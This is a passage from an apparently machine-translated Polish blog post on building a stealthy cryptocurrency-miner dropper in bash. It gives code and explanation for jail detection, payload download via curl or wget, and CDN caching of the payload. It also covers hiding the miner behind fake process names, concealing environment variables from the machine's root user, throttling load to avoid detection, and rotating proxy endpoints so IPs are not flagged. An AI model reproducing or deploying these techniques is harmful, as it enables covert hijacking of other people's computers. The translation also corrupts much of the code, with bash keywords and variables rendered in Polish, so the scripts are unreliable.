[ -n<span class="hljs-string">"<span class="hljs-variable"> $tmppath</span>"</span> ] &amp;&amp; <span class="hljs-built_in"> Płyta CD</span><span class="hljs-string">"<span class="hljs-variable"> $tmppath</span>"</span></code></pre><p> Sprawdzanie, czy w ciągu<a href="https://en.wikipedia.org/wiki/OS-level_virtualization"> pojemnik</a>  jest również przydatny, możemy sondować system plików w poszukiwaniu podpowiedzi</p><pre><code class="bash hljs">c=$(<span class="hljs-built_in">builtin</span> compgen -G <span class="hljs-string">'/etc/cpa*'</span>)
d=$(<span class="hljs-built_in">builtin</span> compgen -G <span class="hljs-string">'/dev/*'</span>)
s=$(<span class="hljs-built_in">builtin</span> compgen -G <span class="hljs-string">'/sys/*'</span>)
p=$(<span class="hljs-built_in">builtin</span> compgen -G <span class="hljs-string">'/proc/*'</span>)
jail=
<span class="hljs-keyword">if</span> [ -n <span class="hljs-string">"<span class="hljs-variable"> $c</span>"</span>  -o -z<span class="hljs-string">"<span class="hljs-variable"> $d</span>"</span>  -o -z<span class="hljs-string">"<span class="hljs-variable"> $s</span>"</span>  -o -z<span class="hljs-string">"<span class="hljs-variable"> $p</span>"</span> ]; <span class="hljs-keyword"> następnie</span><span class="hljs-comment"> ## jesteśmy w więzieniu</span> 
    więzienie=1
<span class="hljs-keyword">fi</span></code></pre><p> Teraz nadszedł czas, aby pobrać nasz ładunek, wybieramy obsługę zarówno wget, jak i curl, wiemy już, jak używać wget z ostrożnymi flagami, w przypadku curl jest trochę inaczej. Musimy stworzyć plik konfiguracyjny i nadpisać<code>CURL_HOME</code></p><pre><code class="bash hljs"><span class="hljs-built_in">echo</span><span class="hljs-string">"url = <span class="hljs-variable"> $uri</span> 
wyjście =<span class="hljs-variable"> ${nazwa}</span><span class="hljs-variable"> ${format}</span> 
limit czasu połączenia = 10
"</span>  &gt; .curlrc
CURL_HOME=<span class="hljs-variable"> $PWD</span>  curl -SOL</code></pre><p> Ostatnim krokiem jest tylko wyodrębnienie ładunku</p><pre><code class="bash hljs"><span class="hljs-built_in">type</span> unzip &amp;&gt;/dev/null &amp;&amp;
    format=<span class="hljs-string">".zip"</span> extract=<span class="hljs-string">"unzip -q"</span> ||
        format=<span class="hljs-string">".tar.gz"</span> extract=<span class="hljs-string">"tar xf"</span></code></pre><p> Warto wspomnieć o wykorzystaniu [CDN] do obsługi ładunku. Tutaj znowu Cloudflare na ratunek ratuje nas przed wydatkami na przepustowość. Po prostu zmieniając nazwę naszego skompresowanego ładunku na<em> rozszerzenie pliku</em>  obsługiwane przez cloudflare...zostaje zbuforowane. Cloudflare nie sprawdza nagłówków tego, co obsługuje, być może dlatego, że robienie tego na taką skalę jest po prostu niepraktyczne.</p><h2 id="adventures_down_bashland"><a class="header-anchor" href="#adventures_down_bashland"> Przygody w Bashland</a></h2><p> Bash został wybrany z założeniem, że jest przenośny, nie wygląda zbyt nie na miejscu i jest bardziej wszechobecny w porównaniu do innych języków skryptowych, takich jak perl, ruby ​​czy python. Prawda jest taka, że ​​samodzielny plik binarny napisany w golangu lub lua byłby znacznie łatwiejszy, z mniejszą liczbą błędów i łatwiejszy w utrzymaniu, w zasadzie bash był najgorszym możliwym wyborem, w mojej obronie, do czasu, gdy tak wiele swędziałem bashem , było już za późno na przepisanie, a także robiło się nudno.</p><p>Istniała również opcja użycia busybox z flagą czasu kompilacji w celu użycia wszystkich wbudowanych (takich jak grep i sed), jednak użycie wbudowanych w ten sposób nie pozwala na tworzenie zadań (fork) i naraża demona na potencjalne zakleszczenia.</p><p> Opiszę tutaj niektóre funkcje basha, z pełną listą dostępną<a href="\assets/posts/bash_functions.txt"> tutaj</a></p><pre><code class="bash hljs"><span class="hljs-comment">## echo a string long $1 of random lowercase chars</span><span class="hljs-function"><span class="hljs-title">rand_string</span></span>() {
    <span class="hljs-built_in">local</span> c=0
    <span class="hljs-keyword">while</span> [ <span class="hljs-variable">$c</span> -lt <span class="hljs-variable">$1</span> ]; <span class="hljs-keyword">do</span><span class="hljs-built_in">printf</span><span class="hljs-string">"\x<span class="hljs-subst"> $(printf '%x' $((97+LOSOWY%25)</span>))"</span> 
        c=$((c+<span class="hljs-number">1</span>))
    <span class="hljs-keyword"> Gotowe</span>
}</code></pre><p> Użyj<code>RANDOM</code>  zmienna, aby uzyskać liczbę z przedziału 97-122 odpowiadającą kodowi znaku, printf powinien być wbudowany, nie chcemy rozwidlać się w pętli.</p><pre><code class="bash hljs"><span class="hljs-comment">## make a new file descriptor named $1</span><span class="hljs-function"><span class="hljs-title">newfd</span></span>() {
    <span class="hljs-built_in">eval</span><span class="hljs-string">"local fd=\${<span class="hljs-variable"> $1</span>}"</span><span class="hljs-built_in">oceniać</span><span class="hljs-string">"exec <span class="hljs-variable"> $fd</span>&gt;&amp;-"</span>  &amp;&gt;/dev/null
    <span class="hljs-built_in"> lokalny</span>  pp=<span class="hljs-string">".<span class="hljs-subst"> $(rand_string 8)</span>"</span> 
    mkfifo<span class="hljs-variable"> $pp</span><span class="hljs-built_in"> nieoprawny</span><span class="hljs-string">"<span class="hljs-variable"> $1</span>"</span><span class="hljs-built_in">oceniać</span><span class="hljs-string">"exec {<span class="hljs-variable"> $1</span>}&lt;&gt;<span class="hljs-variable"> $pp</span>"</span><span class="hljs-comment"> # odłącz nazwaną rurę</span> 
    rm -f<span class="hljs-variable"> $pp</span>
}</code></pre><p> Wykorzystanie potoków do tworzenia anonimowych deskryptorów plików, które nie zachowują się dokładnie jak deskryptory plików, ale są wystarczająco dobre dla<a href="https://en.wikipedia.org/wiki/Inter-process_communication"> IPC</a>.</p><pre><code class="bash hljs"><span class="hljs-comment">## https://unix.stackexchange.com/a/407383/163931</span><span class="hljs-function"><span class="hljs-title">fleep</span></span>()
{
    <span class="hljs-comment"># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class="hljs-string">"<span class="hljs-variable"> ${_snore_fd}</span>"</span>  -a<span class="hljs-string">"<span class="hljs-variable"> $1</span>"</span>  != 0 ] ||
        newfd _snore_fd
    <span class="hljs-comment"> # log "fleep: zaczynam czekać z ${_snore_fd}"</span><span class="hljs-keyword"> Jeśli</span> ! <span class="hljs-built_in"> Komenda</span> &gt;&amp;<span class="hljs-variable"> ${_snore_fd}</span>; <span class="hljs-keyword"> następnie</span> 
        newfd _snore_fd
    <span class="hljs-keyword">fi</span><span class="hljs-built_in"> czytać</span>  -T<span class="hljs-variable"> ${1:-1}</span>  -u<span class="hljs-variable"> $_snore_fd</span><span class="hljs-comment"> # log "fleep: zakończone"</span>
}</code></pre><p> Uśpienie bez rozwidlenia, nadużywając funkcji limitu czasu wbudowanego odczytu, używa dedykowanego deskryptora pliku i musimy upewnić się, że jest dostępny, aby uniknąć zakończenia.</p><p> Istnieją funkcje takie jak<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code>  służą do monitorowania użycia systemu, wszystkie wykorzystują linux<code>/proc</code>  pliki bez narzędzi, takich jak<code>ps</code> , więc bez rozwidlenia, cały czysty bash.</p><pre><code class="bash hljs"><span class="hljs-function"><span class="hljs-title">start_coproc</span></span>() {
    <span class="hljs-built_in">local</span><span class="hljs-built_in">unset</span><span class="hljs-keyword">while</span> :; <span class="hljs-keyword">do</span><span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable"> $1</span>"</span> = <span class="hljs-built_in"> exec</span> ]; <span class="hljs-keyword"> następnie</span> 
            coproc_name=<span class="hljs-string">"<span class="hljs-variable"> $2</span>"</span><span class="hljs-keyword"> w przeciwnym razie</span> 
            coproc_name=<span class="hljs-string">"<span class="hljs-variable"> $1</span>"</span><span class="hljs-keyword">fi</span><span class="hljs-keyword"> Jeśli</span>  [ -n<span class="hljs-string">"<span class="hljs-variable"> $UNSET_COPROC_VARS</span>"</span> ]; <span class="hljs-keyword"> następnie</span><span class="hljs-built_in"> nieoprawny</span>=<span class="hljs-string">"unset <span class="hljs-variable"> $UNSET_COPROC_VARS</span>;"</span><span class="hljs-keyword">fi</span><span class="hljs-built_in"> Dziennik</span><span class="hljs-string">"starting coproc <span class="hljs-variable"> $coproc_name</span>"</span><span class="hljs-built_in"> nieoprawny</span>  -v<span class="hljs-string">"<span class="hljs-variable"> $coproc_name</span>"</span><span class="hljs-comment"> ## tylko zmienna, nie funkcje</span><span class="hljs-built_in">oceniać</span><span class="hljs-string">"coproc <span class="hljs-variable"> $coproc_name</span> { <span class="hljs-variable"> $nieskonfigurowany</span> $*; }"</span><span class="hljs-comment"> # 2&gt;/dev/null</span><span class="hljs-built_in"> nieoprawny</span>  UNSET_COPROC_VARS
        wait_coproc<span class="hljs-string">"<span class="hljs-variable"> $coproc_name</span>"</span> 3 &amp;&amp; <span class="hljs-built_in"> przerwa</span><span class="hljs-keyword"> Gotowe</span>
}
<span class="hljs-function"><span class="hljs-title"> stop_coproc</span></span>() {
    <span class="hljs-comment"> ## wyczyść fds</span> 
    id_coproc<span class="hljs-string">"<span class="hljs-variable"> $1</span>"</span>  &amp;&amp; [ -n<span class="hljs-string">"<span class="hljs-variable"> $job_n</span>"</span> ] &amp;&amp; <span class="hljs-built_in">oceniać</span><span class="hljs-string">"kill -<span class="hljs-variable"> ${2:-9}</span> %<span class="hljs-variable"> $job_n</span>"</span> ||
        { <span class="hljs-built_in">oceniać</span><span class="hljs-string">"kill -<span class="hljs-variable"> ${2:-9}</span> \${<span class="hljs-variable"> ${1}</span> _PID}"</span>; } ||
        { <span class="hljs-built_in"> Dziennik</span><span class="hljs-string">"could not kill the specified coprocess with job <span class="hljs-variable"> $job_n</span>"</span> &amp;&amp; <span class="hljs-built_in"> powrót</span> 1; }
}</code></pre><p> Koprocesy są dostępne od bash<code>v4</code> , są jak zadania, z wyjątkiem tego, że mają nazwę i własne deskryptory plików.</p><pre><code class="bash hljs"><span class="hljs-comment">## clear file descriptors</span><span class="hljs-function"><span class="hljs-title">clear_fds</span></span>() {
    <span class="hljs-built_in">local</span> fd
    <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> $(compgen -G <span class="hljs-string">"/proc/<span class="hljs-variable"> $BASHPID</span> /fd/*"</span>); <span class="hljs-keyword"> robić</span> 
        fd=<span class="hljs-variable"> ${fd/*\/}</span><span class="hljs-keyword"> Jeśli</span> [[ ! <span class="hljs-string">" $* "</span> =~ <span class="hljs-string">" <span class="hljs-variable"> ${fd}</span> "</span> ]]; <span class="hljs-keyword"> następnie</span><span class="hljs-keyword"> Obudowa</span><span class="hljs-string">"<span class="hljs-variable"> $fd</span>"</span><span class="hljs-keyword"> w</span>
                    0|1|2|255|<span class="hljs-string">"<span class="hljs-variable"> $_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class="hljs-built_in">oceniać</span><span class="hljs-string">"exec <span class="hljs-variable"> $fd</span>&gt;&amp;-"</span>
                        ;;
                <span class="hljs-keyword"> esac</span><span class="hljs-keyword">fi</span><span class="hljs-keyword"> Gotowe</span>
}</code></pre><p> Piszemy demona, który jest długotrwałym procesem i używamy wielu deskryptorów plików, naprawdę chcemy zrobić kilka porządków, aby uniknąć ponoszenia<a href="https://web.archive.org/web/https://linux.die.net/man/5/limits.conf"> ograniczenia</a>.</p><pre><code class="bash hljs"><span class="hljs-comment">## queries ipinfo and gets the current ip and country/region</span><span class="hljs-function"><span class="hljs-title">parse_ip</span></span> ()
{
    <span class="hljs-built_in">export</span> ip country region;
    [ ! -e cfg/geoip.json ] &amp;&amp; <span class="hljs-built_in">log</span><span class="hljs-string">"geolocation codes file not found."</span> &amp;&amp; <span class="hljs-built_in">return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class="hljs-string">"<span class="hljs-variable"> $ipquery</span>"</span> ] &amp;&amp; <span class="hljs-built_in"> Dziennik</span><span class="hljs-string">"failed querying ipinfo"</span> &amp;&amp; <span class="hljs-built_in"> powrót</span> 1;
    before_after <span class="hljs-string"> 'ip\": \"'</span><span class="hljs-string">"<span class="hljs-variable"> $ipquery</span>"</span><span class="hljs-string">'\"'</span> ;
    ip=$(<span class="hljs-built_in"> Echo</span><span class="hljs-variable"> $po</span> );
    [ -z<span class="hljs-string">"<span class="hljs-variable"> $ip</span>"</span> ] &amp;&amp; <span class="hljs-built_in"> Dziennik</span><span class="hljs-string">"failed parsing ipinfo data ip"</span> &amp;&amp; <span class="hljs-built_in"> powrót</span> 1;
    before_after <span class="hljs-string"> 'kraj\": \"'</span><span class="hljs-string">"<span class="hljs-variable"> $ipquery</span>"</span><span class="hljs-string">'\"'</span> ;
    kraj=$(<span class="hljs-built_in"> Echo</span><span class="hljs-variable"> ${po,,}</span> );
    [ -z<span class="hljs-string">"<span class="hljs-variable"> $kraj</span>"</span> ] &amp;&amp; <span class="hljs-built_in"> Dziennik</span><span class="hljs-string">"failed parsing ipinfo data country"</span> &amp;&amp; <span class="hljs-built_in"> powrót</span> 1;
    <span class="hljs-keyword"> podczas</span><span class="hljs-built_in"> czytać</span>  l;<span class="hljs-keyword"> robić</span><span class="hljs-keyword"> Jeśli</span> [ <span class="hljs-string">"<span class="hljs-variable"> ${l}</span>"</span> != <span class="hljs-string">"<span class="hljs-variable"> ${l/\": {}</span>"</span> ]; <span class="hljs-keyword"> następnie</span> 
            przed po<span class="hljs-string">'"'</span><span class="hljs-string">"<span class="hljs-variable"> $l</span>"</span><span class="hljs-string">'"'</span> ;
            ostatni region=$(<span class="hljs-built_in"> Echo</span><span class="hljs-variable"> $po</span>);
        <span class="hljs-keyword"> w przeciwnym razie</span><span class="hljs-keyword"> Jeśli</span> [ <span class="hljs-string">"<span class="hljs-variable"> ${l}</span>"</span> != <span class="hljs-string">"<span class="hljs-variable"> ${l/\"<span class="hljs-variable"> ${kraj}</span>\"}</span>"</span> ]; <span class="hljs-keyword"> następnie</span> 
                region=<span class="hljs-variable"> $ostatni region</span>;
                <span class="hljs-built_in"> przerwa</span>;
            <span class="hljs-keyword">fi</span>;
        <span class="hljs-keyword">fi</span>;
    <span class="hljs-keyword"> Gotowe</span>  &lt;cfg/geoip.json
}</code></pre><p> Ta funkcja opiera się na<a href="https://ipinfo.io/"> ipinfo</a>  określenie regionu pracownika, co pozwala na dostrojenie pewnej logiki zależnej od regionu,<a href="\assets/posts/geoip.json"> geoip.json</a>  grupuje kraje w regiony, ponieważ chcemy mieć region najwyższego poziomu i nie jesteśmy zainteresowani konkretnym krajem.</p><pre><code class="bash hljs"><span class="hljs-comment"># try to open a connection to host $1 with port $2 and output to $3</span><span class="hljs-function"><span class="hljs-title">open_connection</span></span>() {
    <span class="hljs-built_in">exec</span> {socket}&lt;&gt;/dev/tcp/<span class="hljs-variable">${1}</span>/<span class="hljs-variable">${2}</span> 2&gt;/dev/null
    <span class="hljs-built_in">echo</span><span class="hljs-variable">$socket</span> &gt;&amp;<span class="hljs-variable">${3}</span>
}

<span class="hljs-comment">## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class="hljs-function"><span class="hljs-title">check_connection</span></span>() {
    <span class="hljs-built_in">local</span> host=<span class="hljs-variable">$1</span> port=<span class="hljs-variable">$2</span> conn_socket=
    [ -z <span class="hljs-string">"<span class="hljs-variable"> $host</span>"</span> ] &amp;&amp; { <span class="hljs-built_in"> Echo</span><span class="hljs-string"> „brak hosta”</span>; <span class="hljs-built_in"> powrót</span> 1; }
    [ -z <span class="hljs-string">"<span class="hljs-variable"> $port</span>"</span> ] &amp;&amp; { <span class="hljs-built_in"> Echo</span><span class="hljs-string"> „brak portu”</span>; <span class="hljs-built_in"> powrót</span> 1; }
    newfd conn_socket
    timeout 3 open_connection <span class="hljs-variable"> $host</span><span class="hljs-variable"> $port</span><span class="hljs-variable"> $conn_socket</span><span class="hljs-comment"> # odczytaj fd otwartego połączenia z conn_socket fd i zamknij je</span> 
    przeczytaj_fd<span class="hljs-variable"> $conn_socket</span>  śr -
    <span class="hljs-keyword"> Jeśli</span>  [ -n<span class="hljs-string">"<span class="hljs-variable"> $avl</span>"</span> ]; <span class="hljs-keyword"> następnie</span><span class="hljs-comment"> # zamknij połączenie</span><span class="hljs-built_in">oceniać</span><span class="hljs-string">"exec <span class="hljs-variable"> ${śr.}</span>&lt;&amp;-"</span>  &amp;&gt;/dev/null
        <span class="hljs-built_in"> powrót</span> 0 <span class="hljs-comment"> ## można nawiązać połączenie</span><span class="hljs-keyword"> w przeciwnym razie</span><span class="hljs-built_in"> powrót</span> 1 <span class="hljs-comment"> ## nie można nawiązać połączenia</span><span class="hljs-keyword">fi</span>
}</code></pre><p> Bash ma wsparcie dla połączeń tcp, dzięki skończeniu abstrakcji<code>/dev/tcp</code>  (również dla udp, ale większość wydaje się być zwykle wyłączona w czasie kompilacji, więc nie możesz na niej polegać). Te pliki to bash, nie są częścią linuksa<code>/dev</code>  drzewo.</p><p>Warto wspomnieć również o systemie blokowania do obsługi współbieżności między zadaniami bash. Aby umożliwić wielu zadaniom pracę z blokadami, wszystkie muszą dzielić deskryptor pliku, więc nasze<code>locker</code>  która jest również pracą, musi być uruchomiona przed innymi pracami, które chcą użyć blokady. Szafka po prostu czyta dalej<code>stdin</code>  oczekiwanie na żądania blokowania, odpowiadanie włączone<code>stdout</code>  w zależności od aktualnego stanu logicznego przechowywanego w zmiennej. Nie gwarantuję, że to podejście jest wolne od wyścigu, ale wydaje się działać przyzwoicie, z drugiej strony uważam, że deskryptory plików nie są zbyt wiarygodne, ponieważ podejrzewam, że są pewne bufory, które nie są opróżniane gdzieś w dół<em> Rury</em>  i w końcu trafienie w zakleszczenie (co oznacza, że ​​nie możesz polegać na tym, że szafka zawsze daje ci odpowiedź).</p><pre><code class="bash hljs"><span class="hljs-comment">## unset bash env apart excluded vars/funcs</span><span class="hljs-function"><span class="hljs-title">clear_env</span></span>(){
    <span class="hljs-built_in">local</span><span class="hljs-built_in">functions</span>=$(<span class="hljs-built_in">declare</span> -F)
    <span class="hljs-built_in">functions</span>=<span class="hljs-variable">${functions//declare -f }</span><span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span><span class="hljs-variable">$@</span>; <span class="hljs-keyword">do</span><span class="hljs-built_in">functions</span>=<span class="hljs-variable">${functions/$u[[:space:]]}</span><span class="hljs-built_in">functions</span>=<span class="hljs-variable">${functions/[[:space:]]$u}</span><span class="hljs-built_in">functions</span>=<span class="hljs-variable">${functions/[[:space:]]$u[[:space:]]}</span><span class="hljs-keyword">done</span><span class="hljs-built_in">local</span> vars=$(<span class="hljs-built_in">set</span> -o posix; <span class="hljs-built_in">set</span> | <span class="hljs-keyword">while</span><span class="hljs-built_in">read</span> l; <span class="hljs-keyword">do</span><span class="hljs-built_in">echo</span><span class="hljs-variable">${l/=*}</span>; <span class="hljs-keyword">done</span>)
    <span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span><span class="hljs-variable">$@</span>; <span class="hljs-keyword">do</span>
        vars=<span class="hljs-variable">${vars/$u[[:space:]]}</span>
        vars=<span class="hljs-variable">${vars/[[:space]]$u}</span>
        vars=<span class="hljs-variable">${vars/[[:space:]]$u[[:space:]]}</span><span class="hljs-keyword">done</span><span class="hljs-built_in">unset</span> -f <span class="hljs-variable">$functions</span> &amp;&gt;/dev/null
    <span class="hljs-built_in">unset</span> -v <span class="hljs-variable">$vars</span> &amp;&gt;/dev/null
    <span class="hljs-comment"># unset $vars &amp;&gt;/dev/null</span>
}

<span class="hljs-comment">## unexport most variables</span><span class="hljs-function"><span class="hljs-title">dex_env</span></span>() {
    exported=$(<span class="hljs-built_in">export</span> -p)
    <span class="hljs-keyword">while</span><span class="hljs-built_in">read</span> e; <span class="hljs-keyword">do</span>
        n=<span class="hljs-variable">${e/declare -*x }</span>
        [ <span class="hljs-string">"<span class="hljs-variable"> $n</span>"</span> = <span class="hljs-string">"<span class="hljs-variable"> $e</span>"</span> ] &amp;&amp; <span class="hljs-built_in"> kontyntynuj</span><span class="hljs-comment"> ## zmienna wielowierszowa</span>
        n=<span class="hljs-variable"> ${n/=*}</span><span class="hljs-keyword"> Obudowa</span><span class="hljs-string">"<span class="hljs-variable"> $n</span>"</span><span class="hljs-keyword"> w</span><span class="hljs-string">"SHELL"</span>|<span class="hljs-string">"USER"</span>|<span class="hljs-string">"HOME"</span>|<span class="hljs-string">"TMUX"</span>|<span class="hljs-string">"CHARSET"</span>|<span class="hljs-string">"TERM"</span>)
                <span class="hljs-built_in"> kontyntynuj</span> 
                ;;
            *)
                deportowany=<span class="hljs-string">"<span class="hljs-variable"> $wywieziony</span><span class="hljs-variable"> ${n/=*}</span>"</span><span class="hljs-keyword"> esac</span><span class="hljs-keyword"> Gotowe</span> &lt;&lt;&lt;<span class="hljs-string">"<span class="hljs-variable"> $eksportowane</span>"</span><span class="hljs-built_in"> eksport</span>  -n<span class="hljs-variable"> $wywieziony</span>
}</code></pre><p> Posprzątaj swoje śmieci... złożone programy basha wykorzystują wiele zmiennych, a jeśli nadużyjesz globalnej przestrzeni, robi się wzdęty. Jeśli tworzysz zadania powłoki, dziedziczą one całe środowisko (które jest skutecznie zduplikowane, a nie współdzielone), możesz szybko skończyć z jedzeniem bash<code>100M</code>  pamięci, nieładnie. Poza tym naprawdę chcemy być dyskretni. W naszym scenariuszu wdrożenia przeciwnik<sup id="fnref:adversary"><a class="fnref" href="#fndef:adversary">[1]</a></sup>  może potencjalnie mieć dostęp do roota i pełne informacje o naszych procesach<sup id="fnref:infoproc"><a class="fnref" href="#fndef:infoproc">[2]</a></sup>  , i wiesz... każdy proces zawiera informacje o pełnej komendzie, która go uruchomiła, oraz o wyeksportowanych zmiennych środowiskowych.</p><h2 id="configuration"><a class="header-anchor" href="#configuration"> Konfiguracja</a></h2><p>Gdy mamy już nasze środowisko i nasze narzędzia, musimy dostroić naszego górnika do maszyny, na której działa, kroki konfiguracyjne w pseudokodzie:</p><ul><li><p> nazwa procesu dla górnika</p></li><li><p> informacje o hoście (ram/rdzeni/cache/<code>ENV_VARS</code>)</p></li><li><p> wersja konfiguracyjna</p></li><li><p><code>worker_id</code>  dla górnika (z ip i hosta)</p></li><li><p> ip/port dla połączenia</p></li></ul><p> Wybranie nazwy dla procesu jest wymagane, aby<em> ukryć</em>  fakt, że prowadzimy górnika, ale nie tylko zmieniamy nazwę naszego pliku binarnego, mamy listę<strong> maski</strong>  dla potencjalnych kandydatów (zwykły plik tekstowy, w którym każda linia jest maską):</p><ul><li><p> wybierz losowo maskę</p></li><li><p> przetasuj elementy końca łańcucha (wszystkie z wyjątkiem pierwszego), aby uzyskać zróżnicowane polecenie procesu. Teraz mamy ciąg wyglądający jak<code>cmd --arg2 --arg1 --arg3</code> . To jest nasza maska ​​górnika, uruchamiamy plik binarny<em> z pominięciem</em>  argumenty, ale wygląda na to, że uruchomiliśmy polecenie<code>cmd</code>  z argumentami<code>--arg1 --arg2 --arg3</code> . Spacje i myślniki są dozwolone w nazwach plików, więc dobrze jest uruchomić plik binarny o takiej nazwie, nie wydaje się, aby Linux rozróżniał plik wykonywalny od argumentów podczas przechowywania poleceń procesu.</p><p> Konfiguracja górnika jest automatycznie ładowana z<code>$PWD</code>.</p></li></ul><h3 id="hashrate"><a class="header-anchor" href="#hashrate"> Hashrate</a></h3><p> , z czasem górnik z górą dopływał do wielu<strong> automatyczne strojenie</strong>  funkcji, więc część moich skryptów stała się zbędna, ale różnica między upstream i downstream polega na tym, że celem upstream jest maksymalizacja<em> wydajność</em> , a naszym celem jest maksymalizacja<em> wydajność i zaciemnianie</em> , nie chcemy prześcignąć systemu, chcemy trochę przesadzić bez zakłóceń w działaniu.<sup id="fnref:monerominer"><a class="fnref" href="#fndef:monerominer">[3]</a></sup></p><p> W tym celu potrzebujemy bardziej szczegółowego zrozumienia środowiska,<code>l2/l3</code>  struktura pamięci podręcznej procesora, pamięci RAM i rdzeni oraz bieżący procesor<em> przeciętny</em>  obciążenie i procesor<em> stosowanie</em>. Próbowałem zbudować<a href="https://en.wikipedia.org/wiki/Finite-state_machine"> maszyna stanowa</a>  w bash, który zacząłby od absolutnego minimum i wypróbowywał różne konfiguracje, powoli ustalając się na średniej najlepszej. To było<strong> ogromny</strong>  strata wysiłku zaśmiecona<a href="https://en.wikipedia.org/wiki/Technical_debt"> dług techniczny</a>  który zbankrutował bardzo szybko i został w większości odrzucony, z resztkami pozostałymi w bazie kodu.</p><p> Frack całego tego automatycznego tuningu, właśnie uśpiliśmy górnika w zależności od użycia/obciążenia hosta, co wymagało modyfikacji górnika, aby<code>sleep</code>  między wydajnościami wątków i kilka poprawek do watchdoga konfiguracji<sup id="fnref:configwatch"><a class="fnref" href="#fndef:configwatch">[4]</a></sup> , co pozwoliłoby nam ponownie załadować ilość spania w czasie wykonywania. Logika jest znacznie uproszczona i wygląda tak:</p><ul><li><p> jeśli użycie jest powyżej/poniżej $TARGET_USAGE (± margines błędu) zwiększ/zmniejsz sen</p></li><li><p> jeśli średnie obciążenie w ciągu<code>1m</code>  jest powyżej/poniżej $TARGET_LOAD wstrzymaj/wznów wydobycie</p></li></ul><h3 id="connection"><a class="header-anchor" href="#connection"> Połączenie</a></h3><p> W naszym podsumowaniu basha pokazaliśmy narzędzia do podłączenia. Dlaczego ich potrzebujemy? Ponieważ potrzebujemy różnorodności; po prostu twarde zakodowanie punktu końcowego w konfiguracji nie potrwa długo, gdy coś wygląda podejrzanie i ma aktywność sieciową, adresy IP są oznaczane.</p><p> Na początku eksperymentowaliśmy z kilkoma metodami:</p><ul><li><p> za pomocą<a href="https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains"> łańcuchy proxy</a>  przeciążać wywołania sieci górników, ale wymagało to zbudowania górnika z dynamicznymi bibliotekami i trzeba było je wysłać z ładunkiem, więc było to niepraktyczne.</p></li><li><p> biegać<a href="https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost"> tunel do przodu</a>  ramię w ramię z górnikiem: miało to dużo narzutów związanych z konfiguracją, ponieważ teraz konfigurowaliśmy dwa procesy przy każdym wdrożeniu, co oznaczało więcej błędów.</p></li></ul><p>Na koniec ustaliliśmy, wysyłając listę punktów końcowych, przechowywaną w zmiennych basha, wybierając jeden losowo. Połączenia były oczywiście szyfrowane. Jakie są te punkty końcowe? Spedytorzy do pełnomocnika, który zajmowałby się zadaniami górników.</p><img alt="" src="/assets/posts/chronichles_of_a_cryptonote_dropper/code/output/miner.png"/><p> Dlaczego potrzebujemy<a href="https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy"> proxy górnicze</a> ? Tak naprawdę nigdy nie przekroczyłem ~100 jednoczesnych połączeń, więc serwer proxy nie był tak naprawdę potrzebny do obciążenia sieci, ale był wygodny do negocjowania algorytmu mieszającego i zapewniania różnych celów trudności różnym górnikom, aby uniemożliwić górnikom pracę nad<strong> trudność</strong>  celów, których ukończenie zajęłoby im zbyt dużo czasu i pozwoliłoby uniknąć ryzyka marnowania obliczeń na niedokończone zadania.<sup id="fnref:difficulty"><a class="fnref" href="#fndef:difficulty">[5]</a></sup>  Oprogramowanie puli wymagało również kilku modyfikacji, ponieważ szczęśliwie reklamowało się jako proxy na zwykłych żądaniach http...<em> to musiało przekroczyć limit czasu</em> i rozwidlenia dodał kontrolę dostępu, więc oparliśmy na tym nasze mody.<sup id="fnref:stratumprotocol"><a class="fnref" href="#fndef:stratumprotocol">[6]</a></sup></p><h3 id="editing_json"><a class="header-anchor" href="#editing_json"> Edycja json</a></h3><p> Wprowadzając modyfikacje do pliku json za pomocą samego bash, osiągnęliśmy trochę podstawienia env var i trochę regex. Początkowo polegaliśmy na<code>envsubst</code>  binarny, aby zastosować zmienne, potem przeszliśmy do pełnego bash<sup id="fnref:fullbash"><a class="fnref" href="#fndef:fullbash">[7]</a></sup>  z tą logiką:</p><ul><li><p> przeczytaj szablon konfiguracji</p></li><li><p> zamień wszystkie cudzysłowy na bardzo ezoteryczny ciąg (np.<code>_#_#</code>)</p></li><li><p><code>eval</code>  szablon</p></li><li><p> zastąp wszystkie ezoteryczne zdarzenia cytatami</p></li></ul><p> Oprócz unikania podprocesów, kolejną zaletą jest to, że w naszych szablonach otrzymujemy pełne możliwości bash. Aby czytać i pisać bez szablonów, musimy polegać na możliwościach bash regex:</p><pre><code class="bash hljs">cc_rgx=<span class="hljs-string">'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class="hljs-function"><span class="hljs-title">change_config</span></span>() {
	<span class="hljs-built_in">local</span> subs
	<span class="hljs-keyword">while</span><span class="hljs-built_in">read</span> l; <span class="hljs-keyword">do</span><span class="hljs-keyword">if</span> [ <span class="hljs-string">"<span class="hljs-variable"> ${l}</span>"</span> != <span class="hljs-string">"<span class="hljs-variable"> ${l/\"*$1*\"*:/}</span>"</span> ]; <span class="hljs-keyword"> następnie</span>
			[[ <span class="hljs-string">"<span class="hljs-variable"> ${l}</span>"</span> =~ <span class="hljs-variable"> $cc_rgx</span>  ]]
mecze=(<span class="hljs-string">"<span class="hljs-variable"> ${BASH_REMATCH[@]}</span>"</span> )
[ -n<span class="hljs-string">"<span class="hljs-variable"> ${pasuje[3]}</span>"</span>  -a<span class="hljs-string">"<span class="hljs-variable"> {2:0:1} USD</span>"</span> != <span class="hljs-string">"\""</span>  ] &amp;&amp;
subs=<span class="hljs-string">"\"<span class="hljs-variable"> $2</span>\""</span>  ||
subs=<span class="hljs-string">"<span class="hljs-variable"> $2</span>"</span> 
